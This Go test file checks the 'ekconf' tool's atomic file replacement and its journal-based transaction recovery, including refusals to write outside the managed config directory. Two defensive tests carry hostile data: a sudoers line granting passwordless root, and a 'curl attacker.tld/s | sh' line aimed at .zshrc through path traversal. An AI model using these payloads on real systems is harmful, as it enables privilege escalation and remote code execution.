package cmd

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"testing"

	"github.com/eznix86/ekconf/internal/config"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestReplaceFilesAtomically_RollsBackOnSecondFailure(t *testing.T) {
	dir := t.TempDir()
	firstPath := filepath.Join(dir, "first.txt")
	secondPath := filepath.Join(dir, "second.txt")

	require.NoError(t, os.WriteFile(firstPath, []byte("first-old"), 0o600))
	require.NoError(t, os.WriteFile(secondPath, []byte("second-old"), 0o600))

	oldCreateTempFile := createTempFile
	oldRenameFile := renameFile
	t.Cleanup(func() {
		createTempFile = oldCreateTempFile
		renameFile = oldRenameFile
	})

	createTempFile = os.CreateTemp
	count := 0
	renameFile = func(oldPath, newPath string) error {
		count++
		if count == 2 {
			return errors.New("boom")
		}
		return os.Rename(oldPath, newPath)
	}

	err := replaceFilesAtomically([]fileUpdate{
		{path: firstPath, data: []byte("first-new")},
		{path: secondPath, data: []byte("second-new")},
	})
	require.Error(t, err)

	firstData, err := os.ReadFile(firstPath)
	require.NoError(t, err)
	assert.Equal(t, "first-old", string(firstData))

	secondData, err := os.ReadFile(secondPath)
	require.NoError(t, err)
	assert.Equal(t, "second-old", string(secondData))
}

func TestRecoverPendingFileTransaction(t *testing.T) {
	setupTestHome(t)

	firstPath, err := config.EncPath()
	require.NoError(t, err)
	secondPath, err := config.ConfigPath()
	require.NoError(t, err)
	journalPath, err := transactionJournalPath()
	require.NoError(t, err)
	require.NoError(t, os.MkdirAll(filepath.Dir(journalPath), 0o700))

	require.NoError(t, os.WriteFile(firstPath, []byte("first-old"), 0o600))
	require.NoError(t, os.WriteFile(secondPath, []byte("second-old"), 0o600))

	journal := fileTransaction{Updates: []journalUpdate{
		{Path: firstPath, Data: []byte("first-new")},
		{Path: secondPath, Data: []byte("second-new")},
	}}
	journalData, err := json.Marshal(journal)
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(journalPath, journalData, 0o600))

	require.NoError(t, recoverPendingFileTransaction())

	firstData, err := os.ReadFile(firstPath)
	require.NoError(t, err)
	assert.Equal(t, "first-new", string(firstData))

	secondData, err := os.ReadFile(secondPath)
	require.NoError(t, err)
	assert.Equal(t, "second-new", string(secondData))

	_, err = os.Stat(journalPath)
	require.Error(t, err)
	assert.True(t, os.IsNotExist(err))
}

func TestRecoverPendingFileTransaction_RefusesPathOutsideStore(t *testing.T) {
	setupTestHome(t)

	victim := filepath.Join(t.TempDir(), "sudoers.d", "pwn")
	require.NoError(t, os.MkdirAll(filepath.Dir(victim), 0o755))

	journal, err := transactionJournalPath()
	require.NoError(t, err)
	require.NoError(t, os.MkdirAll(filepath.Dir(journal), 0o700))

	payload, err := json.Marshal(fileTransaction{Updates: []journalUpdate{
		{Path: victim, Data: []byte("brunobernard ALL=(ALL) NOPASSWD: ALL\n")},
	}})
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(journal, payload, 0o600))

	err = recoverPendingFileTransaction()
	require.ErrorContains(t, err, "not a file ekconf manages")

	_, statErr := os.Stat(victim)
	assert.True(t, os.IsNotExist(statErr), "attacker-chosen path must not be written")
}

func TestRecoverPendingFileTransaction_RefusesTraversalIntoStore(t *testing.T) {
	setupTestHome(t)

	dir, err := config.Dir()
	require.NoError(t, err)
	victim := filepath.Join(dir, "..", ".zshrc")

	journal, err := transactionJournalPath()
	require.NoError(t, err)
	require.NoError(t, os.MkdirAll(filepath.Dir(journal), 0o700))

	payload, err := json.Marshal(fileTransaction{Updates: []journalUpdate{
		{Path: victim, Data: []byte("curl attacker.tld/s | sh\n")},
	}})
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(journal, payload, 0o600))

	err = recoverPendingFileTransaction()
	require.ErrorContains(t, err, "not a file ekconf manages")

	_, statErr := os.Stat(filepath.Clean(victim))
	assert.True(t, os.IsNotExist(statErr), "traversal out of ~/.ekube must not be written")
}

func TestRecoverPendingFileTransaction_AllowsManagedPaths(t *testing.T) {
	setupTestHome(t)

	encPath, err := config.EncPath()
	require.NoError(t, err)
	journal, err := transactionJournalPath()
	require.NoError(t, err)
	require.NoError(t, os.MkdirAll(filepath.Dir(journal), 0o700))

	payload, err := json.Marshal(fileTransaction{Updates: []journalUpdate{
		{Path: encPath, Data: []byte("recovered")},
	}})
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(journal, payload, 0o600))

	require.NoError(t, recoverPendingFileTransaction())

	data, err := os.ReadFile(encPath)
	require.NoError(t, err)
	assert.Equal(t, []byte("recovered"), data)

	_, statErr := os.Stat(journal)
	assert.True(t, os.IsNotExist(statErr), "journal must be consumed")
}
